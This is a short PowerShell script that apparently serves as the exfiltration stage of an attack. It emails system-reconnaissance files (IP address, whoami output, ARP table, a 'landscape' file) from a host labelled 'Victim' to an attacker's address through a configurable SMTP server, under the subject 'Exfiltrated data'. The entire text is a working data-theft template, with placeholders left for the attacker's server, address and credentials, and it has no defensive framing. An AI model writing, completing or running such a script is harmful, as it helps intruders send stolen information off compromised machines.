$From = "Victim <victim@victim.com>"
$To = "YOUR NAME <YOUR EMAIL ADDRESS>"
$Subject = "Exfiltrated data"
$Body = "Please find attached the exfiltrated data."
$SMTPServer = "yoursmtpserver.what"
$SMTPPort = "smtpserverport"
$Password = ConvertTo-SecureString "yourauthenticationtokensmtp" -AsPlainText -Force
$Username = "smtp username"
$Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $Username, $Password
Send-MailMessage -From $From -to $To -Subject $Subject -Body $Body -BodyAsHtml -SmtpServer $SMTPServer -Port $SMTPPort -Credential $Credentials -Attachments "ipaddress.txt", "landscape.txt", "whoami.txt", "arptable.txt"
